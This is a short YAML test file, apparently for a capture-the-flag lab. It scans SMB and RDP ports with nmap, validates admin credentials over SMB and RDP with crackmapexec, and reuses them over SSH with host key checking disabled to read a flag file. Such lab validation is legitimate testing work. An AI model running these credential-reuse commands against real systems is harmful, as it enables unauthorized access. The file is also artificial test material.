test:
  steps:
    - name: "Verify SMB and RDP services are running"
      command: "nmap -sV -p 445,3389 {target.target}"
      expect: "445/tcp"

    - name: "Verify SMB credentials with crackmapexec"
      command: "crackmapexec smb {target.target} -u {cred.admin.user} -p {cred.admin.pass} --shares 2>&1"
      expect: "private"

    - name: "Verify RDP credential reuse with crackmapexec"
      command: "crackmapexec rdp {target.target} -u {cred.admin.user} -p {cred.admin.pass} 2>&1"
      expect: "+"

    - name: "Retrieve flag via SSH credential reuse"
      command: "sshpass -p '{cred.admin.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.admin.user}@{target.target} 'cat /home/admin/flag.txt' 2>/dev/null"
      expect: "OCR{"
